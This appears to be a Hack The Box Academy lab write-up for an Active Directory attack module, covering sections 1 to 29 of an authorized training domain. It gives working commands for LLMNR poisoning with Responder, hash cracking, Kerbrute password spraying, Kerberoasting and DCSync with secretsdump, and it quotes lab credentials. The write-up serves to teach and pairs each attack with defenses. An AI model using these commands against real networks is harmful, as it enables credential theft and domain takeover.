**Platform:** Hack The Box Academy  
**Module:** Active Directory Enumeration & Attacks  
**Coverage:** All 36 official sections; two skills assessments; original lab evidence archive (74 screenshots)  
**Lab domain:** `INLANEFREIGHT.LOCAL`  
**Authoring style:** Original technical explanation; commands and findings are separated from reference-only steps  
**Scope:** Authorized HTB Academy training environments only  
**Prepared:** November 2026

> **Evidence integrity notice.** This report incorporates screenshots from the user's uploaded archive under **Captured evidence**. Evidence from another author's walkthrough is **not** represented as an original capture. Some stages in Assessment Part II are reconstructed from the user-supplied final answers and the credited public write-ups; they are marked **Walkthrough-derived / not independently pictured**. Target IPs are ephemeral and should not be reused in another spawn. Credentials and hashes are from a deliberately vulnerable training lab.

## Executive Summary

The module connects foundational Active Directory reconnaissance to operational attack paths: anonymous and credentialed enumeration; poisoned name resolution; password attacks; Kerberos ticket abuse; access-control analysis; local and domain privilege escalation; inter-domain trusts; and defensive hardening. The most important learning outcome is **iteration**: every credential, host, share, ticket, or graph edge creates additional enumeration opportunities.

Two end-to-end assessments demonstrate the method. In **Part I**, an exposed ASP.NET Antak shell led to local SYSTEM access on WEB01, Kerberoasting of `svc_sql`, WinRM access to MS01, discovery of a second principal's credentials in LSA secrets, validated DCSync permissions and eventually DC01 access. In **Part II**, a Linux foothold on PAR01 led through Responder/NetNTLMv2, `AB920`, Kerbrute password spraying, SMB-hosted SQL credentials, SQL Server execution, local privilege escalation, graph-based ACL analysis, control of `CT059`, and a domain replication attack against the KRBTGT account.

**Evidence scale.** The supplied ZIP contains 74 original JPEG screenshots. The report uses a curated subset at relevant steps and includes an **evidence inventory** so all files remain available for audit. A screenshot verifies only the observation displayed in that image, not every subsequent step in the chain.

## Lab Topology and Evidence Provenance

### Assessment Part I — Observed / described infrastructure

| Asset | Address | Role |
|---|---|---|
| WEB01 (`WEB-WIN01`) | Public IP changed between spawns; internal `172.16.6.100` | IIS / Antak foothold, dual-homed pivot |
| MS01 | `172.16.6.50` | Lateral-movement objective |
| DC01 | `172.16.6.3` | Domain controller |
| Kali/Pwnbox | `10.10.14.21` in the recorded session | Attacker workstation / Chisel server |

### Assessment Part II — Observed infrastructure

| Asset | Address | Role |
|---|---|---|
| PAR01 (`skills-par01`) | `10.129.14.35` public, `172.16.7.240/23` internal | Authorized Linux attack host |
| DC01 | `172.16.7.3` | LDAP, SMB, Kerberos, domain control |
| MS01 | `172.16.7.50` | Initial Windows foothold and subsequent administrator target |
| SQL01 | `172.16.7.60` | `SQLEXPRESS` instance, OS execution foothold |

**Evidence classes:** `Captured` = user-supplied screenshot or direct console output in this conversation; `User-provided result` = final answer expressly supplied by the user but not visible as proof in the ZIP; `Reference method` = procedural detail cross-checked against public third-party write-ups; `Conceptual` = general technique, not a claim that the user executed it.

---

## 01. Introduction to Active Directory Enumeration & Attacks

Active Directory integrates directory objects, authentication, authorization and group policy. Its attack surface is not just the Domain Controller: a normal workstation, a leaked service-account password, an over-permissive share and an Access Control Entry (ACE) can all become components of a domain compromise path. The environment must therefore be mapped as a graph of **identities**, **machines**, **network reachability** and **effective rights** rather than as a single vulnerable box.

A disciplined assessment begins by establishing legal scope and avoiding unsupported assumptions about hostname naming, credentials and routing. In both assessments, separate network ranges and different account sets were encountered. Discovery should be recorded with its source and time; a DNS answer, LDAP computer object, SMB authentication or flag read represents different strengths of evidence. A large LDAP list does not prove that each computer is powered on; a TCP port open does not prove a successful application-level login.

**Core learning:** Build a repeatable discovery → validation → exploitation → impact → remediation workflow. Preserve logs and reproducibility, mark unverified claims, and never confuse demonstrative commands with successful execution. This module contains 36 official sections, listed in order below.

## 02. Tools Of The Trade

The Linux toolset commonly includes Nmap for service detection, `ldapsearch` and NetExec/CrackMapExec for directory and protocol enumeration, `smbclient` for shares, Kerbrute for Kerberos password checks, Responder for name-resolution poisoning, Hashcat/John for offline cracking, Impacket for remote execution and directory replication, BloodHound/SharpHound for attack-path graphs, and Metasploit for controlled payload delivery. Windows-native tools include `whoami`, `net`, `nltest`, `setspn`, `Get-AD*` where RSAT exists, ADSI/DirectorySearcher when it does not, and PowerShell remoting.

Check availability instead of assuming that every lab image contains the same binaries:

```bash
command -v nmap; command -v ldapsearch; command -v kerbrute
command -v responder; command -v hashcat; command -v smbclient
command -v impacket-secretsdump; command -v evil-winrm
```

Version and platform matter. In Part I, Rubeus was absent and required transferring a Windows executable; on PAR01 Part II, `nxc` was absent but `ldapsearch` worked. On Kali, `/usr/bin/impacket-secretsdump` turned out to be a shell wrapper, not an importable Python script; feeding it to `runpy.run_path()` caused a `SyntaxError`. Likewise, `SeDebugPrivilege`, `SeImpersonatePrivilege` and an available DLL should be treated as indicators of potential capability rather than proof of exploitability. Record commands, effective identities, source/destination addresses and tool errors.

## 03. Scenario

The module is framed as an authorized internal assessment of a Windows enterprise. A typical attack chain involves starting from a lower-trust vantage point, identifying domain services, obtaining an initial user, enumerating trusts and security controls, finding exploitable misconfigurations and demonstrating the impact of privileged access. The two assessment networks should be treated as **separate lab instances**, even though both use `INLANEFREIGHT.LOCAL` and labels such as MS01.

**Part I starting condition:** a previously discovered upload vulnerability exposed an Antak web shell at `/uploads/antak.aspx` with lab-provided login credentials. **Part II starting condition:** SSH access to PAR01 was provided, with `htb-student` credentials. The intended assessment is to understand how each new privilege expands the reachable security boundary, not merely to list flag strings. Distinguish the initial trust boundary (external-to-web or Linux foothold-to-LAN), the lateral boundary (normal user-to-server), and the directory boundary (a user able to edit a privileged group or replicate secrets).

## 04. External Recon and Enumeration Principles

External recon validates what the engagement exposes before internal access. Collect assigned IP ranges, registered domains, nameserver/MX data, TLS certificates, application fingerprints, public usernames and potentially exposed files. Prefer passive checks for unapproved assets, and restrict active scans to permitted ranges. An external webpage can reveal IIS/ASP.NET and upload paths, while a DNS zone or document metadata may reveal domain account naming conventions.

```bash
# Authorized examples; replace with an in-scope target.
whois example.org
dig example.org A MX NS TXT
curl -I http://TARGET/
sudo nmap -sV -Pn -p 80,443,445,5985 TARGET
```

In the Part I engagement, HTTP enumeration found an IIS front end and `/uploads/` directory leading to the known web-shell entry point. Service discovery should be tied to a test plan: 80/443 for HTTP, 445 for SMB, 88 for Kerberos, 389/636 for LDAP, 135 for RPC, 5985/5986 for WinRM and 1433 for SQL Server. **Defensive significance:** public metadata disclosure and unneeded services reduce the cost of reconnaissance; use segmentation, authenticated publishing and accurate inventory.




![Captured evidence 032: Scoped service scan / host-fingerprint example](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_032.jpg "CAPTURED - E032 Scoped service scan / host-fingerprint example. Original image from user archive.")



## 05. Initial Enumeration of the Domain

Once on the internal network, identify the domain controller, DNS resolver, the local machine's domain membership, reachable subnets, computer accounts and exposed services. Use multiple independent views because DNS resolution, LDAP membership and live connectivity may disagree. Part I provided a striking example: `ACADEMY-EA-MS01` was guessed incorrectly, whereas LDAP returned the actual `MS01.INLANEFREIGHT.LOCAL` entry and DNS mapped it to `172.16.6.50`.

```powershell
whoami /all
ipconfig /all
nltest /dsgetdc:INLANEFREIGHT.LOCAL
([adsisearcher]'(objectCategory=computer)').FindAll() |
  ForEach-Object { $_.Properties['name'][0] }
Resolve-DnsName MS01.INLANEFREIGHT.LOCAL -Server 172.16.6.3 -Type A
```

An ADSI `DirectorySearcher` requires a valid directory bind and an authenticated token. Some web shells start a new PowerShell process per Submit, so variables defined across separate requests vanish. Combining statements within one execution fixed that issue in Part I. An LDAP entry indicates directory registration; confirm network access with TCP checks and authentication before declaring a target exploitable.




![Captured evidence 038: Host and SMB enumeration from a guided lab](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_038.jpg "CAPTURED - E038 Host and SMB enumeration from a guided lab. Original image from user archive.")

![Captured evidence 055: Computer-object discovery / domain host list](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_055.jpg "CAPTURED - E055 Computer-object discovery / domain host list. Original image from user archive.")



## 06. LLMNR/NBT-NS Poisoning - from Linux

LLMNR (UDP 5355), NBT-NS (UDP 137) and related fallback resolution can be abused when a host searches for a name that DNS does not resolve. A responder on the same accessible network replies as if it owns that name and may receive NTLM challenge-response authentication. This yields **NetNTLMv2**, not the user's password or raw NT hash. Captured material may be cracked offline if the password is weak.

```bash
ip -br a
sudo responder -I ens224
sudo ls -lt /usr/share/responder/logs/
# Illustrative offline check after collecting an authorized capture:
hashcat -m 5600 ~/captured.hash /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ~/captured.hash --show
```

Part II used `ens224` (`172.16.7.240/23`), with Responder reporting LLMNR, NBT-NS and SMB listeners enabled. It wrote an `SMB-NTLMv2-SSP-172.16.7.3.txt` log. A TCP bind error on RDP port 3389 did not invalidate the functioning SMB capture. Hashcat produced `AB920:weasal` from a captured response. **Mitigation:** disable legacy multicast/broadcast resolution where feasible, enforce SMB signing and restrict outbound NTLM.




![Captured evidence 036: Responder poisoning and NetNTLMv2 capture in guided practice](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_036.jpg "CAPTURED - E036 Responder poisoning and NetNTLMv2 capture in guided practice. Original image from user archive.")

![Captured evidence 072: Name-resolution poisoning events observed on the wire](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_072.jpg "CAPTURED - E072 Name-resolution poisoning events observed on the wire. Original image from user archive.")



## 07. LLMNR/NBT-NS Poisoning - from Windows

Windows-based interception uses the same protocol weakness but different tooling: Inveigh, for example, can monitor and respond to LLMNR/NBT-NS and capture challenge-response material. It requires care to avoid disrupting legitimate name resolution. Run it only in an authorized segment, log the time and interface, and verify that the apparent client IP and username derive from an actual observed authentication exchange.

```powershell
# Typical authorized lab technique; command is illustrative,
# not evidence that this exact command was run in the uploaded screenshots.
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -LLMNR Y -ConsoleOutput Y -FileOutput Y
```

In the cited Part II public walkthrough, Inveigh is the method used to obtain material associated with the later `CT059` credential, subsequently cracked offline to `charlie1`. **Evidence status here:** the user supplied that final result, but the ZIP does not independently show the Inveigh capture and crack as a continuous sequence. The architectural lesson remains the same as Linux poisoning: name-resolution fallback plus weak passwords permits credential discovery. Implement DNS hygiene, disable unused legacy protocols, alert on unexpected UDP 5355/137 responders, and segment clients from critical servers.

## 08. Password Spraying Overview

Password spraying attempts one or a small number of candidate passwords across many accounts, differing from brute-forcing many passwords against one user. Its success depends on username coverage, lockout behavior, policy exceptions and how the authentication protocol reports failures. Password reuse and onboarding defaults such as `Welcome1` are common weaknesses. Even in labs, account lockout policy should be checked *before* a spray.

A successful result is not just a tool's generic summary; it must show a valid user/password pair, such as Kerbrute's `VALID LOGIN` event. In Part II, the successful login was `BR086@INLANEFREIGHT.LOCAL:Welcome1`. Strong protection combines weak-password screening, MFA, fine-grained and monitored account policy, and alerting on distributed failed logons. Sprays are risky in real environments: authentication traffic can trigger lockouts, service instability, and incident response.




![Captured evidence 006: Kerbrute password spraying output](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_006.jpg "CAPTURED - E006 Kerbrute password spraying output. Original image from user archive.")



## 09. Enumerating & Retrieving Password Policies

Policy determines what a safe, permitted authentication test looks like. Domain-wide settings include password length, history, complexity, expiration and lockout threshold; **Fine-Grained Password Policies (PSOs)** may apply different rules to specific users or groups. Do not infer that a domain policy applies to all principals.

```bash
ldapsearch -LLL -x -H ldap://172.16.7.3 \
  -D 'AB920@INLANEFREIGHT.LOCAL' -w 'weasal' \
  -b 'DC=INLANEFREIGHT,DC=LOCAL' -s base '(objectClass=*)' \
  lockoutThreshold lockoutDuration lockOutObservationWindow
```

In Part II, the user observed `lockoutThreshold: 0` at the domain root, with `lockoutDuration` and `lockOutObservationWindow` both `-18000000000` (100 ns units). The zero threshold indicates no lockout under that *domain-default* rule, not that all target users lack PSOs or account-specific restrictions. The WinRM attempts to run `net accounts /domain` failed with `Access is denied`, plausibly because of a second-hop authorization problem; a direct LDAP bind from PAR01 succeeded. **Recommendation:** enforce appropriate lockout/abuse controls with MFA and detection, and inventory PSOs explicitly.

## 10. Password Spraying - Making a Target User List

A clean user list avoids fake or malformed principals and prevents sending attempts to service accounts or disabled/privileged targets inadvertently. Collect usernames from allowed LDAP, RPC, Kerberos, SMB and directory read operations. Use `sAMAccountName` rather than deriving names from display names; account names are not necessarily email addresses.

```bash
ldapsearch -LLL -x -E pr=200/noprompt \
  -H ldap://172.16.7.3 -D 'AB920@INLANEFREIGHT.LOCAL' -w 'weasal' \
  -b 'DC=INLANEFREIGHT,DC=LOCAL' \
  '(&(objectCategory=person)(objectClass=user))' sAMAccountName \
  | awk '/^sAMAccountName: /{print $2}' | sort -u > domain-users.txt
wc -l domain-users.txt
```

In the observed Part II run, paginated LDAP enumeration returned **2,901** usernames. Without paging, the LDAP server returned `Size limit exceeded (4)`, explaining the incomplete initial list. Filter built-in and excluded accounts when the scope requires it. The list itself should be treated as potentially sensitive asset data, stored only in the authorized lab and removed afterward.




![Captured evidence 012: Authenticated LDAP enumeration output](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_012.jpg "CAPTURED - E012 Authenticated LDAP enumeration output. Original image from user archive.")



## 11. Internal Password Spraying - from Linux

From the Linux attack host, Kerbrute can validate a password candidate against a controlled user list by contacting the domain KDC. A crucial distinction: Kerberos responses validate user/password combinations but do not automatically confer any service authorization. Follow a success with a least-privilege authentication check to the needed protocol.

```bash
kerbrute passwordspray -d INLANEFREIGHT.LOCAL \
  --dc 172.16.7.3 domain-users.txt 'Welcome1'
```

The user's Part II screenshot shows `VALID LOGIN: BR086@INLANEFREIGHT.LOCAL:Welcome1`. That username/password was then used to open an SMB share containing a sensitive development configuration. The result demonstrates how a single weak account can provide much greater access than its assigned job role would suggest. In real assessments, always consult the engagement's authorization/lockout requirements and use bounded request rates.




![Captured evidence 006: Kerbrute identifies a valid login in Assessment Part II](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_006_sec11.jpg "CAPTURED - E006 Kerbrute identifies a valid login in Assessment Part II. Original image from user archive.")



## 12. Internal Password Spraying - from Windows

Windows-side spraying is commonly implemented through authenticated PowerShell and the domain's Kerberos or LDAP interfaces. Compared with Linux, the key operational concern is inherited identity and network logon context: a remote PowerShell shell might not delegate credentials to another server. Verify the identity and authentication path before interpreting a failed bind as a wrong password.

Typical tools include PowerView-related helpers, `runas` with network credentials, and controlled validation scripts. Record the attempted principal and whether Kerberos, LDAP or SMB actually handled the authentication. For defenders, protect against distributed low-frequency failures with event correlations rather than simplistic per-account thresholds. For this report's Part II run, the Linux Kerbrute method has direct captured evidence; Windows spraying is covered conceptually, **not asserted as a user-performed step**.

## 13. Enumerating Security Controls

Identify domain controls before executing noisy or disruptive tests: firewall policy, host-based protection, EDR, AV, AppLocker/WDAC, SMB signing, UAC, privileged-access management, audit policy and endpoint restrictions. These determine what results can be interpreted safely. An executable failing to launch could indicate a blocked binary, missing dependency, application control or actual exploit failure.

```powershell
whoami /groups
whoami /priv
Get-MpComputerStatus
Get-NetFirewallProfile
Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
```

Part I recorded a High integrity token and enabled `SeDebugPrivilege`, `SeBackupPrivilege`, `SeImpersonatePrivilege` on MS01 for `svc_sql`. Part II showed `SeImpersonatePrivilege` in SQL01's service-token context. Those observations identify candidate privilege-escalation conditions but do not substitute for a successful SYSTEM identity check. A careful write-up includes both failed control checks and successful ones, with no claims that an absent registry value proves all protection is disabled.




![Captured evidence 061: MS01 privilege and login-session context](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_061.jpg "CAPTURED - E061 MS01 privilege and login-session context. Original image from user archive.")



## 14. Credentialed Enumeration - from Linux

With one valid domain user, collect LDAP users/groups/computers, SMB shares, SMB signing settings, SQL endpoints, Kerberos SPNs and domain policy. The aim is not unbounded data extraction; it is to identify relationships relevant to the assessment path. SMB enumeration may return an empty user set even when authentication succeeds. In Part II, the user observed exactly this with SMB/SAMR; switching to LDAP delivered the data.

```bash
ldapsearch -LLL -x -H ldap://172.16.7.3 \
  -D 'AB920@INLANEFREIGHT.LOCAL' -w 'weasal' \
  -b 'DC=INLANEFREIGHT,DC=LOCAL' '(objectClass=computer)' dNSHostName
smbclient -L //172.16.7.3 -U 'INLANEFREIGHT\\AB920%weasal'
```

For an assessment, document each protocol's privilege context and whether output is complete. LDAP controls such as pagination are necessary for large domains. Search for shares and files that broaden access (`web.config`, unattended scripts, backup manifests) while preserving original permissions and minimizing side effects. **Defense:** review share ACLs and restrict user enumeration when appropriate without breaking standard directory functionality.




![Captured evidence 031: Linux-based directory and service enumeration](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_031.jpg "CAPTURED - E031 Linux-based directory and service enumeration. Original image from user archive.")



## 15. Credentialed Enumeration - from Windows

Windows-native and .NET directory APIs make it possible to enumerate without installing RSAT. ADSI and `System.DirectoryServices.DirectorySearcher` can list users, computers and SPNs from a domain-joined host. `nltest` locates a domain controller; `setspn -Q` finds service principal names. PowerView can add richer ACL, group and policy queries when present.

```powershell
nltest /dsgetdc:INLANEFREIGHT.LOCAL
setspn -Q MSSQLSvc/SQL01.inlanefreight.local:1433
$s = New-Object System.DirectoryServices.DirectorySearcher
$s.Filter='(objectCategory=computer)'
$s.FindAll() | ForEach-Object { $_.Properties['name'][0] }
```

In the Part I Antak environment, one-command execution was important because session state did not persist between submissions. In the Part II Evil-WinRM environment, `DirectorySearcher.FindAll()` returned an operations error from the remote shell, while explicitly authenticated LDAP from PAR01 worked. **Troubleshooting principle:** test DNS, identity, network credentials, LDAP bind and token delegation separately rather than guessing at an endpoint name.




![Captured evidence 009: PowerShell/AD user enumeration and troubleshooting](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_009.jpg "CAPTURED - E009 PowerShell/AD user enumeration and troubleshooting. Original image from user archive.")



## 16. Living Off the Land

Living-off-the-land (LOTL) is the use of binaries, APIs and administrative utilities already provided by the operating system to accomplish a task. Examples include `whoami`, `net`, `nltest`, `setspn`, PowerShell, WMI/CIM, `certutil`, `rundll32` and service-control utilities. Their presence does not automatically mean malicious activity; the risk arises from invocation context, target, command-line arguments and follow-on behavior.

During Part I, Windows built-ins provided AD enumeration, WinRM execution, connectivity testing, and even a memory-dump API. For defenders, monitor unusual parent-child relationships, script-block content, network targets and high-risk command lines instead of simply blocking common administrative binaries. For testers, avoid disabling defenses or making unnecessary persistent changes just to use a LOTL technique.

## 17. Kerberoasting - from Linux

Kerberoasting targets service accounts with SPNs. A domain-authenticated principal may request a service ticket; the encrypted portion can be tested offline against candidate passwords. The ticket type matters: RC4-HMAC TGS material is often handled with Hashcat `-m 13100` or John `krb5tgs`, whereas AES ticket formats require different handling. Acquiring a ticket is not equivalent to proving the service password is weak.

```bash
# Conceptual, permission-scoped example:
impacket-GetUserSPNs INLANEFREIGHT.LOCAL/USERNAME:PASSWORD \
  -dc-ip DC_IP -request
hashcat -m 13100 service_tgs.txt /usr/share/wordlists/rockyou.txt
```

Part I specifically identified `CN=svc_sql` with SPN `MSSQLSvc/SQL01.inlanefreight.local:1433`. A service ticket was exported through Rubeus on Windows, returned to Kali and cracked with John. Service accounts with predictable passwords can become powerful lateral-movement credentials; rotating them and adopting gMSAs or long randomly generated passwords reduces the weakness.




![Captured evidence 033: Service-ticket hash and offline cracking with John](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_033.jpg "CAPTURED - E033 Service-ticket hash and offline cracking with John. Original image from user archive.")



## 18. Kerberoasting - from Windows

From a Windows domain context, `setspn -Q` reveals a targeted SPN, and Rubeus can request a TGS for offline testing. Windows and Linux ticket representations differ, so copied output sometimes needs format normalization before John or Hashcat accepts it. This is a parsing issue, not necessarily a ticket-encryption failure.

```powershell
setspn -Q MSSQLSvc/SQL01.inlanefreight.local:1433
# Windows lab tool example:
.\Rubeus.exe kerberoast /spn:MSSQLSvc/SQL01.inlanefreight.local:1433 /nowrap
```

In the Part I lab, John initially reported `No password hashes loaded` because the TGS label included `:1433` in a format variant and generic username placeholders. After normalizing the ticket label in a *copy* of the file, John loaded one `krb5tgs` hash and recovered the password `lucky7`. This enabled subsequent WinRM authentication as `svc_sql`. Keep the unmodified ticket as evidence, and distinguish harmless formatting changes from altering cryptographic data.




![Captured evidence 019: Target SPN found with Windows setspn](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_019.jpg "CAPTURED - E019 Target SPN found with Windows setspn. Original image from user archive.")

![Captured evidence 029: Rubeus Kerberoasting and ticket transfer](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_029.jpg "CAPTURED - E029 Rubeus Kerberoasting and ticket transfer. Original image from user archive.")



## 19. Access Control List (ACL) Abuse Primer

An AD object's security descriptor contains a Discretionary ACL listing allow/deny ACEs for security principals. Rights such as `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, selected extended rights, group membership modification and password reset can create escalation paths even without membership in Domain Admins. The object's **scope** and inheritance matter: an ACE on a particular OU or group is not equivalent to control of the entire domain.

Evaluate **effective permission**, not just one ACE: group nesting, explicit deny entries, inherited rights and ownership can change the answer. The Part II graph path ended with `CT059` having `GenericAll` over the `Domain Admins` group. This is highly sensitive because the principal can modify the group's membership. **Defense:** limit and continuously audit write access on privileged groups, domain root objects and high-value OUs; validate changes with independent approval.

## 20. ACL Enumeration

ACL enumeration maps who can modify which AD objects. PowerView, BloodHound/SharpHound, LDAP security-descriptor controls and ADSI can reveal rights, including replication privileges at the domain root. GUIDs identify extended rights; merely seeing a `GenericAll`-like label without the target object and principal is insufficient.

```powershell
$d=[ADSI]'LDAP://DC=INLANEFREIGHT,DC=LOCAL'
$d.ObjectSecurity.Access | Where-Object {
  $_.ObjectType -in @(
    [guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',
    [guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')
} | Select-Object IdentityReference,ActiveDirectoryRights,ObjectType,AccessControlType
```

Part I's direct output showed explicit Allow entries for `INLANEFREIGHT\tpetty` covering `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`; the finding was independently followed by a successful DRSUAPI extraction. In Part II, the supplied result `CT059` over Domain Admins is based on the assessment answer and published BloodHound walkthrough, **not directly pictured in the uploaded screenshots**.




![Captured evidence 069: Domain-root replication ACE enumeration in Part I](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_069.jpg "CAPTURED - E069 Domain-root replication ACE enumeration in Part I. Original image from user archive.")



## 21. ACL Abuse Tactics

A writeable group, computer, user or directory object can permit privilege escalation without a software exploit. Examples include modifying privileged group membership when `GenericAll` applies, resetting a controlled account's password, changing an object's owner or DACL, or controlling a resource involved in authentication. The attacker must prove rights against the **specific target** and understand the resulting audit trail.

A Part II reference path is `CT059` → `GenericAll` over `Domain Admins` → group membership modification → privileged DC access. This is the step that crosses from an account with a narrow-looking identity to domain-wide control. It is a different issue from Part I's directly assigned replication rights to `tpetty`. **Defense:** harden Tier 0 group ACLs; flag non-admin ACE changes and privileged group additions; test access-review procedures against nested groups and delegated administrators.

## 22. DCSync

DCSync abuses legitimate directory replication to retrieve password material from a DC without directly reading `NTDS.dit` from disk. The relevant replication extended rights commonly include `DS-Replication-Get-Changes` (`1131f6aa-...`) and `DS-Replication-Get-Changes-All` (`1131f6ad-...`); filtered-set rights may matter for some secret classes. Requests can be implemented with Impacket or Mimikatz in an authorized lab.

```bash
# Targeted training-lab example, not a general collection of all accounts:
impacket-secretsdump -just-dc-user Administrator -dc-ip DC_IP \
  'DOMAIN/user:password@DC_IP'
```

In Part I, using `tpetty` and a SOCKS tunnel, Impacket eventually returned `Using the DRSUAPI method to get NTDS.DIT secrets` and an Administrator NTLM hash. Initial attempts had timed out through ProxyChains even though simple TCP checks passed: moving from a shell-wrapper invocation to the actual Python `secretsdump.py` with direct PySocks hooking resolved the environment problem. In Part II, the user supplied the KRBTGT NTLM hash as a final answer; the write-up describes the expected DCSync phase but does **not** claim a user-shot screenshot for it.




![Captured evidence 039: DRSUAPI replication method in Part I](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_039.jpg "CAPTURED - E039 DRSUAPI replication method in Part I. Original image from user archive.")



## 23. Privileged Access

Access must be proven at each scope: SQL `sysadmin`, a local Windows administrator token, `NT AUTHORITY\SYSTEM`, a domain group owner, and a Domain Admin are different authorities. Local SYSTEM on a member server does not automatically make the account Domain Admin. Password reuse, cached secrets, poorly constrained delegation or permissive service configuration can connect these roles.

In Part I, `INLANEFREIGHT\svc_sql` obtained WinRM execution on MS01 and appeared in the local Administrators group; `whoami /groups` showed High integrity and built-in Administrators membership. In Part II, `netdb` was SQL Server `sysadmin`, and `xp_cmdshell whoami` executed as `NT SERVICE\MSSQL$SQLEXPRESS`, which had `SeImpersonatePrivilege`. The user later established a Meterpreter session as that service identity. The reference chain then uses local privilege escalation to SYSTEM; a SYSTEM identity check for that later stage is not in the supplied Part II archive.




![Captured evidence 061: Administrator group membership and token privileges](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_061_sec23.jpg "CAPTURED - E061 Administrator group membership and token privileges. Original image from user archive.")



## 24. Kerberos "Double Hop" Problem

When authenticating to a remote host via WinRM, the remote session often cannot reuse the originating user's credentials for a second network authentication. A common symptom is that local commands succeed but LDAP, SMB or `net user /domain` calls to another machine fail. This is not conclusive evidence that the user's password is incorrect or that the destination is offline.

The Part II `AB920` WinRM shell on MS01 produced `System error 5 / Access is denied` for `net accounts /domain` and `net user /domain`, and `DirectorySearcher.FindAll()` produced an operations error. Instead of weakening delegation controls, the operator ran `ldapsearch` on PAR01 with explicit credentials, successfully obtaining users and domain policy. Defensive best practice is to use least-privilege, tightly scoped delegation rather than enabling unconstrained delegation broadly.

## 25. Bleeding Edge Vulnerabilities

Misconfigured or unpatched AD technologies can expose privilege-escalation vulnerabilities involving Kerberos, certificate services, print spooler RPC or computer-account behavior. Names discussed in the module family include noPac/Sam-the-Admin and PrintNightmare; these are **version- and configuration-dependent**, not generic shortcuts that work on all controllers.

For each proposed test, identify the CVE, affected component, patch level, reachable attack surface and required credentials. A version string alone does not prove exploitability. The ZIP includes earlier lab tool output associated with noPac and related service checks. Treat this as an illustration of the vulnerability-assessment method, not as evidence that Part II relied on those vulnerabilities. Maintain patch management, disable unused services, enforce certificate template permissions and review computer-account creation privileges.




![Captured evidence 024: NoPac demonstration from guided module practice](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_024.jpg "CAPTURED - E024 NoPac demonstration from guided module practice. Original image from user archive.")



## 26. Miscellaneous Misconfigurations

Many AD compromises arise from configuration, not a fresh CVE. Common findings include anonymous/overly broad SMB shares, passwords in XML or application configuration, locally privileged service accounts, accessible scripts with embedded credentials, weak SQL service security and loose group delegations. The correct method is to establish a chain of exposure → required privilege → resulting capability → impacted data.

Part II demonstrates this directly: password spraying found `BR086`, the account opened `Department Shares`, and `IT\Private\Development\web.config` contained a SQL connection string with `User ID=netdb;Password=D@ta_bAse_adm1n!`. Separately, SQL `sysadmin` allowed `xp_cmdshell` to run under the database service identity. **Defense:** replace embedded passwords with managed secrets, remove unnecessary share readers, and audit cross-system credentials so that one compromised account does not inherit unintended access.




![Captured evidence 070: SMB share navigation](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_070.jpg "CAPTURED - E070 SMB share navigation. Original image from user archive.")

![Captured evidence 071: Development web.config observed in the SMB share](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_071.jpg "CAPTURED - E071 Development web.config observed in the SMB share. Original image from user archive.")



## 27. Domain Trusts Primer

AD trusts allow identities from one domain or forest to authenticate to resources in another. Important distinctions include child-parent vs forest trusts; one-way vs two-way directions; transitive vs non-transitive scope; selective authentication; SID filtering and the resource domain's authorization decisions. A trust does not automatically grant administrative access—the authorization and identity translation still need to be evaluated.

An assessor should inventory trusted domains, trust direction, name suffix routing and accessible services before testing escalation. **Evidence status:** the ZIP contains some trust-related command/output snapshots from earlier guided exercises, but neither Skills Assessment Part I nor Part II relied on child-parent or cross-forest trust abuse as the recorded decisive path. Trust demonstrations are thus described as module coverage rather than replayed as a Part II exploit.

## 28. Attacking Domain Trusts - Child -> Parent Trusts - from Windows

Windows-side trust enumeration may use `Get-ADTrust`, `nltest /domain_trusts`, PowerView or Mimikatz to inspect domain relationships and available tickets. In a valid, scoped trust lab, a tester examines whether compromised child-domain privileges could be leveraged to reach parent-domain resources through SID-history, ticket or authorization weaknesses. Such transitions demand precise understanding of domain SIDs and trust security boundaries.

```powershell
nltest /domain_trusts
Get-ADTrust -Filter * -ErrorAction SilentlyContinue |
  Select-Object Name,Direction,TrustType,SelectiveAuthentication
```

Do not infer impact from enumeration output alone. A secure configuration includes healthy SID filtering where appropriate, patched DCs, constrained privileged administration and review of Enterprise Admin access. This section records the method and relevant screenshots from prior guided labs, not an assertion of exploitation in the assessment domains.




![Captured evidence 011: Kerberos ticket tooling in a domain trust exercise](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_011.jpg "CAPTURED - E011 Kerberos ticket tooling in a domain trust exercise. Original image from user archive.")



## 29. Attacking Domain Trusts - Child -> Parent Trusts - from Linux

Linux operators can enumerate trusts with authenticated LDAP, SMB/RPC, Kerberos ticket inspection and Impacket tooling. The main challenge is preserving the domain realm and routing required to reach the correct KDC for each trust leg. Incorrect time, DNS mapping or assumed realm name may produce misleading Kerberos errors.

```bash
# Enumerate rather than assume trust relationships:
ldapsearch -LLL -x -H ldap://DC_IP \
  -D 'user@child.example.local' -W \
  -b 'CN=System,DC=child,DC=example,DC=local' \
  '(objectClass=trustedDomain)' cn trustDirection trustType
```

A parent trust that resolves in LDAP does not automatically expose a writable or authenticated path to a parent controller. Capture which realm issued a ticket, which service accepted it and what SID or group rights were actually honored. This distinction is also essential in defenders' trust auditing and SIEM correlation.




